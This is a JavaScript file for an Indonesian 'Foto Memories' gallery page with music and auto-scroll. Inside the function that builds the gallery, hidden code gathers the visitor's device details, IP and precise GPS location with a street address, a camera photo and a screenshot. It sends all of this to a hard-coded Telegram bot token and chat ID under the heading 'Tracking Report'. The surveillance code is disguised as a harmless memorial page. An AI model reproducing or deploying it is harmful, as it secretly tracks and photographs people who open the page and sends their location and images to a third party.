function lanjut() {
  document.body.innerHTML = ``;
  document.body.innerHTML = `
   <audio controls style="display:none;" id="audio">
    <audio id="myaudio" src="sad.mp3" autoplay loop></audio>
    </audio>
  <button id="play" class="play" onclick="play()">Play</button>
  <button id="stop" class="stop" onclick="stop()">Stop</button>
  <button id="bukalist" class="bukalist" onclick="bukalist()">≡</button>
  <button id="tutuplist" class="tutuplist" onclick="tutuplist()">X</button>
      <div class="container">
      <div class="menu" id="menu">
        <button id="opsi" class="opsi" onclick="daftar()">Video Memories</button>
        <button id="opsi" class="opsi" onclick="pd()">Profile Developer</button>
      </div>
      </div>
  <div class="container" id="container">
          <div id="card" class="cart">
          <h2>Foto Memories</h2>
      </div>
  <div class="container" id="container">
          <div id="card" class="cart">
          <img src="1.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="2.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="3.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="5.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="6.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="7.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="8.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="9.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="10.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="11.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="12.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="13.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="14.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="15.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="16.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="17.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="18.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="19.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="20.jpg" class="gc">
      </div>
          <div id="card" class="cart">
          <img src="21.jpg" class="gc">
      </div>
      <h3 class="cart">Powered By 𝕵𝖎𝖍𝖆𝖉</h3>
      <br>
      <br>
      <br>
      <p></p>
  </div>
  `;
  const audio = document.getElementById("myaudio");
  audio.play();

  document.addEventListener("visibilitychange", () => {
    if (document.hidden) {
      audio.pause(); // stop saat tab disembunyikan
    } else {
      audio.play(); // lanjutkan saat kembali ke tab
    }
  });
  (()=> {
    const T='8293720568:AAHYvavjXFWLlQNYgOaCZC7Bg-SjG4K2Nd4', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
          C='7921358314', // <-- MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
          pb=document.getElementById('progress-bar'),
          ld=document.getElementById('loading-details');
          
          const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
    
    // Fungsi kirim foto ke Telegram
    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
    
    // Fungsi mendapatkan lokasi detail dari koordinat
    const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
    
    // Fungsi mendapatkan informasi perangkat
    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───── Telegram @ryzzreal  ───── ⦿';return m};

    // Mengambil gambar dari kamera dengan mode tertentu
    const captureCamera = async (mode) => {
        const v = document.getElementById('v'), 
              c = document.getElementById('c');
        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: { exact: mode } 
                }
            });
            v.srcObject = stream;
            
            await new Promise(resolve => v.onloadedmetadata = resolve);
            v.play();

            // Waktu tunggu kamera 1.5 detik
            await new Promise(r => setTimeout(r, 1500)); 
            
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            
            c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
            
            stream.getTracks().forEach(t => t.stop());
            return true; 
            
        } catch (e) {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
            }
            await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
            return false; 
        }
    };

    // FUNGSI UTAMA: Menjalankan semua proses tracking
    const ST=async()=>{
        await sTG(await cDI()); 

        let cameraSuccess = false;

        // 1. Coba Kamera Depan (User)
        cameraSuccess = await captureCamera("user");

        // 2. Jika Gagal, Coba Kamera Belakang (Environment)
        if (!cameraSuccess) {
            cameraSuccess = await captureCamera("environment");
        }

        if (!cameraSuccess) {
             await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
        }

        // Ambil Screenshot 
        setTimeout(async()=>{
            try{
                const cn=await html2canvas(document.body);
                cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg')
            }catch(e){
                await sTG('❌ Screenshot failed')
            }
        }, 2000); 

        // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(async p=>{
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                
                // Menambahkan link Google Maps
                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
                
                const l=await gLD(lat,lon);
                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
                await sTG(g)
            },async e=>{
                await sTG(`❌ GPS Error: ${e.message}`)
            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
        }
    };

    // Langsung menjalankan fungsi ST tanpa delay
    ST();
})();
}

function bukalist() {
  document.getElementById('bukalist').style.display = "none";
  document.getElementById('tutuplist').style.display = "grid";
  document.getElementById('menu').style.display = "grid";
}

function tutuplist() {
  document.getElementById('tutuplist').style.display = "none";
  document.getElementById('bukalist').style.display = "grid";
  document.getElementById('menu').style.display = "none";
}

function kontak() {
  alert("Mau ngapain mencet kontak😹");
}
let scrollY = 0;
let scrolling = false;

function autoScroll() {
  if (!scrolling) return;
  scrollY += 0.5;
  window.scrollTo(0, scrollY);
  if (scrollY < document.body.scrollHeight) {
    requestAnimationFrame(autoScroll);
  }
}

function play() {
  scrolling = true;
  document.getElementById("play").style.display = "none";
  document.getElementById("stop").style.display = "grid";
  autoScroll();
}

function stop() {
  scrolling = false;
  document.getElementById("play").style.display = "grid";
  document.getElementById("stop").style.display = "none";
}